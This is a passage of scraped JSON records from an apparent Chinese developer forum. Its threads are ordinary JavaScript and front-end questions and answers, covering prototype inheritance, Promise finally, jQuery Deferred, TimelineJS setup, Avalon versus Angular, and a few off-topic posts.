"的方法实现，或者你直接console.test = function(){};也可以~"]},
{"content": ["<div class=\"topic_content\">原本在学angular，后来无意中看到国产avalon，似乎很不错，准备去学学看。<br><br>但就是很想了解下，v2里有没有哪位在用这个框架？做过什么项目 ？感觉如何？ 大家来分享一下吧。</div>"], "reply": "14", "tittle": "有没有人用过 Avalon 框架？前来说说感受呗", "comment": ["用过，比angular轻量一些，且容易上手。不过MVVM的实现思路完全不同，angular是基于脏检测的，avalon是基于defineProperties的。\r", "\r", "个人觉得，和angular1.x相比主要的缺点是B格太低，其他基本是要略胜一筹。\r", "但angular还有来自未来世界的2.0呢。", " 看过，似乎2.0 改动很大", "其实你需要的是 ember.js", "  我都没说我需要什么你就知道我需要什么了。为啥ember.js ?", "其实你需要的reactjs", "其实你需要的reactjs", "其实你需要的是polymer", "我正在用～是我公司前端推荐的～轻量级的，做个小项目还不错", " 哇！", "avalon在ie6-8上有vb的黑魔法...完全不敢用...", "国内一概不用", " 帝老师听说你回家修仙了……", " 有黑魔法才敢用啊。。angular还没有这些黑魔法呢，哈哈", " 是啊！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"kd\">function</span> <span class=\"nx\">superClass</span><span class=\"p\">(</span><span class=\"nx\">name</span><span class=\"p\">,</span> <span class=\"nx\">age</span><span class=\"p\">){</span>\n    <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">name</span> <span class=\"o\">=</span> <span class=\"nx\">name</span><span class=\"p\">;</span>\n    <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">age</span> <span class=\"o\">=</span> <span class=\"nx\">age</span><span class=\"p\">;</span>\n    <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">test</span> <span class=\"o\">=</span> <span class=\"s2\">\"1111\"</span>\n<span class=\"p\">}</span>\n\n<span class=\"nx\">superClass</span><span class=\"p\">.</span><span class=\"nx\">prototype</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n    <span class=\"nx\">consturct</span><span class=\"o\">:</span> <span class=\"nx\">superClass</span><span class=\"p\">,</span>\n    <span class=\"nx\">init</span><span class=\"o\">:</span> <span class=\"kd\">function</span> <span class=\"p\">()</span> <span class=\"p\">{</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"this is superClass init\"</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n\n<span class=\"kd\">function</span> <span class=\"nx\">subClass</span> <span class=\"p\">(</span><span class=\"nx\">name</span><span class=\"p\">,</span> <span class=\"nx\">age</span><span class=\"p\">,</span> <span class=\"nx\">job</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">superClass</span><span class=\"p\">.</span><span class=\"nx\">call</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">,</span> <span class=\"nx\">name</span><span class=\"p\">,</span> <span class=\"nx\">age</span><span class=\"p\">);</span>\n    <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">job</span> <span class=\"o\">=</span> <span class=\"nx\">job</span><span class=\"p\">;</span>\n    <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">test</span> <span class=\"o\">=</span> <span class=\"s2\">\"22222\"</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"nx\">subClass</span><span class=\"p\">.</span><span class=\"nx\">prototype</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">superClass</span><span class=\"p\">();</span>\n<span class=\"nx\">subClass</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">.</span><span class=\"nx\">init</span> <span class=\"o\">=</span> <span class=\"kd\">function</span> <span class=\"nx\">init</span> <span class=\"p\">()</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">job</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">s</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">superClass</span><span class=\"p\">(</span><span class=\"s2\">\"zhanghao\"</span><span class=\"p\">,</span> <span class=\"mi\">22</span><span class=\"p\">);</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">test</span><span class=\"p\">);</span> <span class=\"c1\">// \"1111\"</span>\n<span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">test</span> <span class=\"o\">=</span> <span class=\"s2\">\"wo gai le a\"</span><span class=\"p\">;</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">test</span><span class=\"p\">);</span> <span class=\"c1\">// \"wo gai le a\"</span>\n\n<span class=\"k\">delete</span><span class=\"p\">(</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">test</span><span class=\"p\">);</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">test</span><span class=\"p\">);</span> <span class=\"c1\">// undefined</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">ss</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">subClass</span><span class=\"p\">(</span><span class=\"s2\">\"haha\"</span><span class=\"p\">,</span> <span class=\"mi\">22</span><span class=\"p\">,</span> <span class=\"s2\">\"av nan you\"</span><span class=\"p\">);</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">ss</span><span class=\"p\">.</span><span class=\"nx\">test</span><span class=\"p\">);</span> <span class=\"c1\">// \"22222\"</span>\n<span class=\"nx\">ss</span><span class=\"p\">.</span><span class=\"nx\">test</span> <span class=\"o\">=</span> <span class=\"s2\">\"qtmlgb\"</span><span class=\"p\">;</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">ss</span><span class=\"p\">.</span><span class=\"nx\">test</span><span class=\"p\">);</span> <span class=\"c1\">// qtmlgb</span>\n\n<span class=\"k\">delete</span><span class=\"p\">(</span><span class=\"nx\">ss</span><span class=\"p\">.</span><span class=\"nx\">test</span><span class=\"p\">)</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">ss</span><span class=\"p\">.</span><span class=\"nx\">test</span><span class=\"p\">);</span> <span class=\"c1\">// \"1111\"</span>\n\n<span class=\"k\">delete</span><span class=\"p\">(</span><span class=\"nx\">ss</span><span class=\"p\">.</span><span class=\"nx\">test</span><span class=\"p\">);</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">ss</span><span class=\"p\">.</span><span class=\"nx\">test</span><span class=\"p\">);</span> <span class=\"c1\">// \"1111\"</span>\n</pre></div>\n\n<p>谁能讲解一下这个奇葩现象...</p>\n</div></div>"], "reply": "15", "tittle": "关于 JS 中的继承的奇葩问题", "comment": ["不知道你说的奇葩现象是什么？是指delete(ss.test)之后还能打印11111？你只要仔细研究一下js的原型链就明白了。", "如果一个对象的属性不存在，js会尝试在 prototype 中查找该属性。一直找到最上游，直到找到或者不存在。", " 这两个属性肯定不在原型链里面。我用的this没有用prototype", " 你没仔细看我的代码，原型链这种基础知识...我是知道的。我在this上添加的属性，只能说明this上添加了属性和prototype里面的属性有点不一样", " 道理还是一样的，因为你写了这句 subClass.prototype = new superClass();", " 按原型链的说法，我第一次delete(ss.test)\r", "log出来的应该是22222而不是1111", " 我用this.test=22222，不是prototype.test=22222。这test属性压根不应该在原型链里面。但是ss.test在delete之后竟然可以搜索到父类的test...但是父类的test根本不是自身原型的属性", "js的delete有很多限制， 继承来的属性不能被删除是之一， 举个栗子： 一个人觉得老爹的房子户型很傻逼，看着就闹心，不想要但也不能给砸了，否则自家其他兄弟能把他打出屎来。", " 原来如此。我去研究研究delete-_-#", "确切说是无法删掉原型链中的属性\r", " 不仅是原型中的属性不能删，继承的普通属性也不能删。", " 上面代码就说明了，删除了子类对象的test属性就暴露出了父类的test属性，即便这个test属性是在构造函数中this.test=1111而不是superClass.prototype.test=1111", " 你的理解还是错的。\r", "\r", "你在执行 subClass.prototype = new superClass(); 的时候，实际上创建了一个带 test 属性的对象，并赋值给 subClass 的 原型，也就是说这时候：\r", "subClass.prototype = {test: \"1111\", /* other...*/}\r", "\r", "superClass.prototype.test 确实是 undefined 没错，但 subClass.prototype.test 却是实打实的 1111", " 你根本没看懂我的代码，superClass的test不是prototype的属性，我是在superClass的构造函数里面this.test=1111，而不是superClass.prototype=1111", " 我懂了，是我理解错了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在做一款类似于qq聊天的软件（手机端），采用技术如题所示。<br>\n有一个消息编辑器，可以输入表情等等，我用的iframe来实现，当插入表情的时候，会有两个关键操作：<br>\n1、iframe中的可编辑元素获得焦点；<br>\n2、用execCommand插入表情图片。<br>\n此时很郁闷的一点就是：在可编辑元素获得焦点的时候，软键盘也弹出来了。<br>\n所以我的问题如下：<br>\n可以在webview中控制软键盘的弹出与隐藏吗？如果可以，怎么干呢？<br>\n如果在webview中无法实现，可以通过外面的壳来实现吗？比如用Objectc（ios）或者java（android）？</p>\n</div></div>"], "reply": "5", "tittle": "请教各路英雄好汉一个 H5+webview 的问题", "comment": ["\r", "\r", "好好研究，你就懂了", "插入完成之后再把焦点取消？\r", "\r", "感觉软键盘会闪一下…", " 有ios方面的资料么？", " 是会闪的", " 没研究过 iOS"]},
{"content": ["<div class=\"topic_content\">时隔一年，重新做回博客，感觉现在Hexo资料多了很多，上手也非常方便了。<br><br>同学们来看看呗： <a target=\"_blank\" href=\"http://ciphermagic.github.io/\" rel=\"nofollow\">http://ciphermagic.github.io/</a></div>"], "reply": "13", "tittle": "部署在 github 的 Hexo 博客", "comment": ["自动播放不能忍", "HIGH功能音乐没有自动把虾米音乐关掉。。。", " 我也觉得是啊，马上去改了", " 嗯嗯，虾米音乐今天才加上去的，有时间改改", "收贱点了Ｎ下ＨＩＧＨ，已哭瞎", "好强大，还有rss", "果然好 HIGH。。。", "好high，哈哈～～这抖的，太有感了！", "好带感！", "favicon怎么弄啊，和theme有关么", " 换个图片就行啦", "jacman主题啊，这里有个Hexo中文社区，https://coderq.com，tommy351本人也加入了！PS.评论发链接不违规吧……", "求告知如何部署的？我总是部署不对，部署出来的仅仅只有 public 文件夹下的内容"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://jsbin.com/qucopukoge/1/edit?html,js,output\">http://jsbin.com/qucopukoge/1/edit?html,js,output</a></p>\n\n<p>别的可以更新视图，数组不行。应该怎么写？</p>\n</div></div>"], "reply": "1", "tittle": "求教， Avalon.js 更新整个数组应该怎么写？", "comment": ["直接问正美啊"]},
{"content": ["<div class=\"topic_content\">网站： <a target=\"_blank\" href=\"http://perfectionkills.com/javascript-quiz/\" rel=\"nofollow\">http://perfectionkills.com/javascript-quiz/</a></div>"], "reply": "38", "tittle": "满怀深深的恶意， javaScript 小测验，我只对第一题供 14 题", "comment": ["对6题", "You've got 6 answers wrong (#3, #4, #9, #11, #12, #14).\r", "Very good, but not quite there yet.\r", "\r", "感觉没什么意义", "You've got 4 answers wrong (#6, #7, #8, #10).\r", "Very good, but not quite there yet.", "You've got all 14 answers wrong (#1, #2, #3, #4, #5, #6, #7, #8, #9, #10, #11, #12, #13, #14).\r", "Ouch.", "You've got 9 answers wrong (#1, #2, #3, #6, #8, #9, #11, #13, #14).\r", "That's more than a half :(", "You've got 2 answers wrong (#4, #7).\r", "Very good, but not quite there yet.\r", "\r", "这些测试题2年前左右就见过了，当时错了很多，都是基础的不会，后来恶补了一下\r", "已经很久没看了，现在重新测，发现还是有错的 0。0", "再看了下题目，第4题是粗心错的，蛋疼。\r", "第七题果然左摇右摆还是选错了。", "You've got 0 answers wrong.\r", "Flawless victory.", "You've got 2 answers wrong (#2, #13).\r", "Very good, but not quite there yet.", "唉，谁能讲解一下就好了，只知道自己错了，又不知道为什么是哪个答案。\r", " ，\r", " 你们好厉害！", " F12自己运行一遍就知道答案了", " 我是后端工程师，其实这些都是基础的东西，你要是有耐心的话可以撸一遍javascript的文档。\r", "\r", "表示第2题是看错了。", "You've got 9 answers wrong (#2, #3, #6, #8, #9, #11, #12, #13, #14).\r", "That's more than a half :(\r", "\r", "第2题居然没发现语法错误，\r", "第3题不熟悉delete的用法，\r", "第6题考闭包，本来选对了，犹豫一下改错了，\r", "第8题这种写法还不太熟，\r", "第9题以为不会进入if判断，没想到可以，不懂，\r", "第11题好懂，粗心了，\r", "第12题，函数重复声明，后面覆盖前面？\r", "第13题，不懂，\r", "第14题，不懂。", "You've got 9 answers wrong (#2, #3, #6, #7, #8, #9, #11, #12, #14).\r", "That's more than a half :(", "第九题有问题。FF 是 1number，答案没得选。", " 第九题有问题。FF 是 1number，答案没得选。\r", "因为你运行过一次，所以变量被改变了", " 你在前面定义了 `f` 吧", "错了五个，没什么意义，虽然都是考基础，但有点偏", "You've got 4 answers wrong (#2, #3, #9, #14).\r", "Very good, but not quite there yet", "You've got 13 answers wrong (#1, #2, #3, #4, #5, #6, #7, #8, #9, #10, #11, #12, #14).\r", "That's more than a half :(\r", "\r", "让我想起了大一时做的i+++++i，毕竟智硬 ╮(╯▽╰)╭", "You've got all 14 answers wrong (#1, #2, #3, #4, #5, #6, #7, #8, #9, #10, #11, #12, #13, #14).\r", "Ouch.\r", "\r", "Ouch!!", "You've got 2 answers wrong (#8, #14).\r", "Very good, but not quite there yet.", "这些题最没意义的地方在于，解释器实现方式变一下，可能答案就变了。。。。真蛋疼", "第8题忘了选，第14题还真是不知道。。。", "You've got 6 answers wrong (#3, #6, #7, #8, #9, #12).\r", "Very good, but not quite there yet.\r", "不玩了...", " 这几道题考的内容都是基于 ECMAScript 5 的，题目最开始也说过了…所以答案以后不会变的..", "You've got 6 answers wrong (#1, #3, #4, #8, #9, #13).\r", "Very good, but not quite there yet.\r", "\r", "果然还是差的好远。等下好好理解下。。。", "You've got 12 answers wrong (#1, #2, #3, #5, #6, #7, #8, #9, #11, #12, #13, #14).\r", "That's more than a half :(\r", "\r", "#4  不知道为什么错我选的是\"undefined\"\r", "#10不知道为什么错我选的是\"string\"\r", "\r", "以上做题基于脑内模拟完成", "You've got all 14 answers wrong (#1, #2, #3, #4, #5, #6, #7, #8, #9, #10, #11, #12, #13, #14).\r", "Ouch.", "You've got 5 answers wrong (#2, #3, #8, #12, #14).\r", "Very good, but not quite there yet.\r", "\r", "一瞬间感觉自己很渣……", "You've got 5 answers wrong (#2, #3, #8, #12, #14).\r", "Very good, but not quite there yet.", "You've got 0 answers wrong.\r", "Flawless victory.\r", "深深的恶意", "You've got 10 answers wrong (#4, #5, #6, #7, #8, #9, #10, #11, #13, #14).\r", "That's more than a half :(", "You've got 2 answers wrong (#1, #3).\r", "Very good, but not quite there yet.\r", "\r", "第一题都错了！", " 原来如此 漏看了 不好意思", "You've got 4 answers wrong (#2, #9, #13, #14).\r", "Very good, but not quite there yet.", "作为一个js外行人:\r", "You've got 7 answers wrong (#1, #2, #4, #8, #9, #10, #11).\r", "Very good, but not quite there yet.\r", "\r", "话说js真是坑啊", "```\r", "You've got 2 answers wrong (#3, #9).\r", "Very good, but not quite there yet.\r", "```"]},
{"content": "", "reply": "9", "tittle": "ES6 的 Promise 怎么样才能让一段代码无论成功失败都得以运行呢？貌似没有 finally 方法。", "comment": [".then(final, final)", " 这样子不是要重复写二遍代码，或者要先定义一个函数，无论哪个都不方便。我是说别的异步库都有finally功能反而官方的Promise没有这不太合理，毕竟这个功能很常用的。", " 你用一个变量把 final 绑定住不就好了么……", "那么……\r", "\r", "Promise.prototype.ensure = function (callback) { this.then(callback, callback); }", " \r", "\r", "\r", " 是的我也看到了，还有一个比较完善的polyfill ", "诶…？我记得我用的 Q 就有 finally 方法啊…", "抱歉抱歉，没看到楼主说的 ES6。\r", "→_→或许可以考虑第三方库…", "哈哈, 给ES6的标准委员会发邮件呀, 提需求去..."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">getElementsByName</span><span class=\"p\">(</span><span class=\"s1\">'form'</span><span class=\"p\">)[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nx\">onsubmit</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">input</span> <span class=\"o\">=</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">getElementsByClassName</span><span class=\"p\">(</span><span class=\"s1\">'Input'</span><span class=\"p\">);</span>\n    <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;=</span> <span class=\"nx\">input</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">;</span> <span class=\"nx\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nx\">input</span><span class=\"p\">[</span><span class=\"nx\">i</span><span class=\"p\">].</span><span class=\"nx\">value</span><span class=\"p\">){</span>\n            <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">getElementsByClassName</span><span class=\"p\">(</span><span class=\"s1\">'error'</span><span class=\"p\">)[</span><span class=\"nx\">i</span><span class=\"p\">].</span><span class=\"nx\">style</span><span class=\"p\">.</span><span class=\"nx\">visibility</span> <span class=\"o\">=</span> <span class=\"s2\">\"visible\"</span><span class=\"p\">;</span>\n        <span class=\"p\">}</span>\n    <span class=\"p\">};</span>\n    <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</pre></div>\n\n<p>只要在代码中加入 <code>input[i].value</code> 就没法阻止提交<br>\n去掉.value     像 <code>input[i]</code> 这样就可以阻止提交事件<br>\n求大牛分析一下......为什么获取value值会影响到return false<br>\n求解决办法!</p>\n</div></div>"], "reply": "9", "tittle": "Javascript 阻止默认事件问题.求教", "comment": ["DomElement没有.value属性，你用.value 的时候应该是exception 了", "for (var i = 0; i <= input.length; i++)  这里应该是i < input.length。你写<=，input[i]肯定会undefined，然后读取.value属性异常，return false当然失效了。", " 哦哦谢谢能给个详细的代码吗？", " 把for去掉也不行只要出现了value就出错！", "没有任何调试信息的吧!", "建议你查一下JavaScriptAPI,就大家说的value那里有点问题，我记得好像是nodeValue吧！查API吧，或者console.info(input[i].value)(火狐有效)试一试", "建议先学一下chrome调试相关的文章.\r", "\r", "浏览器提供的api绝大部分情况下是不会出问题的, 绝大部分问题都是因为自己的代码写的不对.\r", "\r", "要定位问题, 而不是乱猜问题. \"咦? 好像这是里错了吧....这样写一下就应该对了吧...\"是程序员最不应该犯的错误.", " 恩恩好的.", "已解决感谢各位.exception之后就可以了."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>类似天天爱消除那种，但是不需要后端也不需要美工设计，只要基本游戏逻辑</p>\n</div></div>"], "reply": "19", "tittle": "做一个纯前端的 js 三消类游戏大概是什么价位和时间", "comment": ["原来这种东西就能卖钱啊", " 你觉得什么才能卖钱", "猪八戒", "大学的时候做过一个。如果需要可以直接拿去用。\r", " 我以为这样的东西都是自己写着玩的", "改吗？", " 挺好玩的", " 挺好玩的+1", " 谢谢，不过还没用过kissy，看不太懂", " 还有base64的图片数组也不明白", "“不需要后端也不需要美工设计” 那就是說費用裏面沒有這方面的咯\r", "“只要基本游戏逻辑” 這個也不需要錢吧，大家都知道三消遊戲的邏輯啊", "窃以为楼主说的不用美工设计的意思是，由设计师出个原型图然后其它的事情都归你做了…\r", "说不定还是压缩过的JPG…", " 对..就是这样，我不知道该报多少价", " 实现基本逻辑", " kissy 当时是觉得新奇用的。其实就是简单的函数库。看着函数名都知道干什么的。", " 大半夜点开，差点被一个good job吓出翔。。。", "楼主，首先不要美术设计不代表不要前端设计。很多交互上的细节，动画，GUI 绘制，都是需要工作量的。\r", "所以楼主需要做的对于一个前端工程师来说，是一个“完整”的游戏，而不是“基本逻辑”。甚至一些交互上的设计可能超出了某些前端工程师的能力范围。\r", "综上，楼主所问到的是什么价位，需要综合各种因素考虑，条件不足。\r", "\r", "不过依我个人的揣测，三四千块应该能找到不少人做。", "看效果。\r", "如果上面的那个链接，1k应该可以。\r", "如果图片漂亮点，你得找人设计ui，画图。\r", "如果交互漂亮点，加点动画，特效，4k应该可以。\r", "\r", "以上。", " 谢谢，不过我不是来请人做的，这个也不是商业用的，来问问大概什么价格参考而已"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>参照了 <a target=\"_blank\" rel=\"nofollow\" href=\"http://segmentfault.com/a/1190000000368066\">http://segmentfault.com/a/1190000000368066</a> ，clone好的自己的仓库在<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/Adward-R/Timeline-Demo\">https://github.com/Adward-R/Timeline-Demo</a> ，部署好的页面通过<a target=\"_blank\" rel=\"nofollow\" href=\"http://timeline-adward.rhcloud.com/\">http://timeline-adward.rhcloud.com/</a> 访问（有VPS+SS）；<br>\n请问用过的开发者们，*.json文件应该放在哪里，页面上能显示出来？</p>\n</div></div>"], "reply": "3", "tittle": "在 OpenShift 上部署 TimelineJS 应用，页面显示 timeline 元素为空，用 curl 添加文章失败", "comment": ["刚好最近也看了一下TimelineJs应用（V2EX的推荐算法这么屌？不科学- -）\r", "\r", "观察了一下github页面的guideline，以内联式为例：\r", "\r", "    <div id=\"timeline-embed\"></div>\r", "    <script type=\"text/javascript\">\r", "        var timeline_config = {\r", "            width:              '100%',\r", "            height:             '600',\r", "            source:             'path_to_json/or_link_to_googlespreadsheet',\r", "            embed_id:           'timeline-embed',               //OPTIONAL USE A DIFFERENT DIV ID FOR EMBED\r", "            start_at_end:       false,                          //OPTIONAL START AT LATEST DATE\r", "            start_at_slide:     '4',                            //OPTIONAL START AT SPECIFIC SLIDE\r", "            start_zoom_adjust:  '3',                            //OPTIONAL TWEAK THE DEFAULT ZOOM LEVEL\r", "            hash_bookmark:      true,                           //OPTIONAL LOCATION BAR HASHES\r", "            font:               'Bevan-PotanoSans',             //OPTIONAL FONT\r", "            debug:              true,                           //OPTIONAL DEBUG TO CONSOLE\r", "            lang:               'fr',                           //OPTIONAL LANGUAGE\r", "            maptype:            'watercolor',                   //OPTIONAL MAP STYLE\r", "            css:                'path_to_css/timeline.css',     //OPTIONAL PATH TO CSS\r", "            js:                 'path_to_js/timeline-min.js'    //OPTIONAL PATH TO JS\r", "        }\r", "    </script>\r", "    <script type=\"text/javascript\" src=\"http://cdn.knightlab.com/libs/timeline/latest/js/storyjs-embed.js\"></script>\r", "\r", "其中source:'path_to_json/or_link_to_googlespreadsheet'中的路径修改为json文件在服务器上的位置或者是发布成功的google文档位置， css:'path_to_css/timeline.css'以及js:'path_to_js/timeline-min.js'中的路径也要修改为自己服务器上的位置，或者直接调用knightlab的CDN上的资源。\r", "\r", "然后将这段代码插到一个HTML页面上，就能访问了。\r", "\r", "实际上，根据 ", " 这个页面上的步骤一步一步来，就能迅速生成一个，可以参考学习一下。\r", "\r", "\r", "最后，我观察了一下LZ的源代码，发现source:   result，我琢磨是路径不对？", "\r", "\r", "你可以参考一下", " 话说我在app的目录下（服务器上）找了一圈都没有找到类似你说的这个html……虽然我已经从git主页拿到源码，暂且可以不需要这个app而部署一个简单的嵌入时间线了（简单的创建方法之前已经成功了）"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>范例： <a target=\"_blank\" rel=\"nofollow\" href=\"http://raki-design.4event.tw/2013newyear/\">http://raki-design.4event.tw/2013newyear/</a></p>\n\n<p>主要需要：通过下拉滚动条，页面进行逐帧动画，每帧为每一张图片，期间需要加入逻辑判断。</p>\n\n<p>实际效果为：<br>\n（拿手机端来说，手指一滑动，车开始启动，如果手指持续滑动，车速就一直那么快，同时滑动过程中出其他的场景）</p>\n\n<p>是不是需要结合jquery来实现？</p>\n</div></div>"], "reply": "5", "tittle": "求助，一个网页交互动画效果。", "comment": ["如果不嫌麻烦也可手撕原生JS。\r", "这个效果说说我自己的思路吧，把需要换帧的图片按顺序命名（pic1，pic2。。），绑定scroll事件，监听当前滚动条scrollTop，N = scrollTop/换页距离,直接换上picN这张图。\r", "这是大致的思路，具体实现可能会碰到未知问题，楼主可一起讨论。", "用一个对象储存帧和位置的关联, 获取进度条位置减去除余帧的倍数, 取值再更改图片.", " 看了几个范例，思路和你描述类似。只是存在细节上的差异性", "滚动视差设计~~", " 正解！就是它，大神你熟悉吗？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>直接进入主题：</p>\n\n<p>[要求] 前台开发人员；会前台技术，特别是Angular JS；有项目经验，有团队协作经验<br>\n [工作内容] 与团队开发人员，UI，产品合作，打造极致体验的网站前台<br>\n [亮点] 都在标题上，重复一下：来自中国和芬兰的创新团队，充满激情的小伙伴；咖啡馆工作环境，位于大学路，工作学习生活身心愉快；在线教育新领域，多语言的工作环境，让你工作学习都不误<br>\n [待遇] 面谈，只要是人才，钱不是问题！</p>\n\n<p>还等什么，我们等你！简历至邮箱或QQ联络:<a target=\"_blank\" rel=\"nofollow\" href=\"mailto:75797004@qq.com\">75797004@qq.com</a> 老鱼</p>\n</div></div>"], "reply": "3", "tittle": "|上海大学路|在线语言教育|中芬创新团队|咖啡馆工作环境|诚聘前台 Angular JS 开发实习生", "comment": ["我以为有图，我就点击来了。", "看到前台想到门口漂亮妹子 ：）", "orz 前端"]},
{"content": "", "reply": "3", "tittle": "jquery masonry 瀑布流怎么居中？", "comment": ["\r", "\r", "找到了\r", "----------------------------------------------------------------------------------------------------------------------------------\r", "参数：\r", "itemSelector     class选择器,默认'.item'，这个表示每个块的选择器\r", "columnWidth     一列的宽度\r", "isAnimated     使用jquery的布局变化,默认true\r", "animationOptions     animate属性渐变效果(Object { queue: false, duration: 500 })\r", "gutterWidth     列的间隙 Integer\r", "isFitWidth     自适应浏览器宽度Boolean\r", "isResizableL     是否可调整大小 Boolean\r", "isRTL     使用从右到左的布局 Boolean", "\r", "\r", "这样? : )", " 谢谢哦，这个Edit fiddle 很不错，(*^__^*)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>var dtd = $.Deferred(); // 新建一个 Deferred 对象<br>\n　　  var wait = function(dtd){<br>\n　　　　var tasks = function(){<br>\n　　　　　　alert(\"执行完毕！\");<br>\n　　　　　　dtd.resolve(); // 改变 Deferred 对象的执行状态<br>\n　　　　};<br>\n　　　　setTimeout(tasks,5000);<br>\n　　　　return dtd;<br>\n　　};<br>\n　　$.when(wait(dtd))<br>\n　　.done(function(){ alert(\"哈哈，成功了！\"); })<br>\n　　.fail(function(){ alert(\"出错啦！\"); });<br>\n　　dtd.resolve();<br>\n这段代码是怎样的执行顺序啊，求解释！我想的是先弹出“执行完毕”而后“哈哈，成功了！”而后“执行完毕”而后“哈哈，成功了”但是执行结果是：先弹出“哈哈，成功了！”而后弹出“执行完毕”</p>\n</div></div>"], "reply": "3", "tittle": "一个有关 js 的 deferred 对象的问题？", "comment": ["done 的意思就是要求必须在状态转变为成功（resolved触发）才触发，你是怎么理解的啊。。。。", " 这是我想的顺序执行：在tasks函数里面有把状态转为成功，我觉得执行到$.when(wait(dtd))是wait函数执行这个时候会alert(\"执行完毕\")而后alert(\"哈哈，成功了！\")；然后执行到dtd.resolve(),alert(\"哈哈，成功了！\");", "$.when接收的应该是Promise对象吧。\r", "\r", "```js\r", "var doSomethingAsync = function(dtd){\r", "    var dtd = $.Deferred();\r", "    var tasks = function(){\r", "　    alert(\"执行完毕！\");\r", "　    dtd.resolve(); // 改变 Deferred 对象的执行状态\r", "　};\r", "　setTimeout(tasks,5000);\r", "　return dtd.promise();\r", "};\r", "\r", "\r", "$.when(doSomethingAsync())\r", "    .done(function(){ alert(\"哈哈，成功了！\"); })\r", "　.fail(function(){ alert(\"出错啦！\"); });\r", "\r", "```"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>需要做一个动态增加表单</p>\n\n<p>动态增加后的表单前面的id ,怎么能互相不干扰 <br>\n目前的情况我在第一个问题下增加2个，再到2个问题里增加前面的ID就不按各自的顺序了</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://121.40.78.230/demo/\">http://121.40.78.230/demo/</a></p>\n\n<p>求教大神</p>\n</div></div>"], "reply": "5", "tittle": "求教 javascripts 动态表单问题", "comment": ["干嘛不把两个count定义成count1和count2啊", " \r", "\r", "网页里有几十条这样的表单啊，不能一次定义几十个变量啊", " 你定义成一个变量，当然序号就是那一个了", "ID用随机生成的一个字符串更好, 只要ID唯一就好了.ID的命名规则需要自己定义好.", "已经搞定谢谢楼上的各位"]},
